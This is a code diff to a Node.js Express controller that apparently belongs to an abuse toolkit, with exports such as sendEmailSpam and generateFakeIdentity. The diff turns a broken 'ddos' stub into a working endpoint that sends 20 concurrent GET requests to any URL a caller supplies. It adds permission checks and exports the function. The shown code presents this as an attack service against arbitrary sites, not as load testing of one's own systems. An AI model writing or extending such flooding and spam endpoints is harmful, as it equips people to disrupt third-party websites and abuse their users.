@@ -294,7 +294,7 @@ const generateFakeIdentity = async (req, res) => {
   }
 };
 
-const ddos = async(req, res) => {
+const ddos = async (req, res) => {
   const authHeader = req.headers.authorization;
   if (!authHeader || !authHeader.startsWith('Bearer ')) {
     return res.status(401).json({ message: 'Not authorized, no token provided' });
@@ -308,24 +308,37 @@ const ddos = async(req, res) => {
       return res.status(401).json({ message: 'Not authorized, user not found' });
     }
 
-    if (!user.permissions.includes('generateFakeIdentity')) {
+    if (!user.permissions.includes('ddos')) {
       return res.status(403).json({ message: 'Access denied, insufficient permissions' });
     }
 
-    const nombre = req.body
-    const url = req.url 
-
-    for (let i = 0; nombre < count; i++){
-      const response = await axios.get(url)
+    const { url } = req.body;
+    if (!url) {
+      return res.status(400).json({ message: 'URL is required' });
     }
 
+    const requests = [];
+    for (let i = 0; i < 20; i++) {
+      requests.push(axios.get(url));
+    }
 
-
+    try {
+      const responses = await Promise.all(requests);
+      const statuses = responses.map((response, index) => ({
+        requestNumber: index + 1,
+        status: response.status,
+      }));
+      res.status(200).json({ message: 'Requests completed', statuses });
+    } catch (error) {
+      console.error('Erreur lors de l\'envoi des requêtes:', error.message);
+      res.status(500).json({ message: 'Error in sending requests', error: error.message });
+    }
   } catch (error) {
-    return res.status(401).json({ message: 'Not authorized, token invalid' });
+    return res.status(401).json({ message: 'Not authorized, token invalid', error: error.message });
   }
 };
 
 
 
-module.exports = { checkEmailExistence, generateSecurePassword, sendEmailSpam, checkPasswordStrength, getSubdomains, generateFakeIdentity};
+
+module.exports = { checkEmailExistence, generateSecurePassword, sendEmailSpam, checkPasswordStrength, getSubdomains, generateFakeIdentity, ddos};
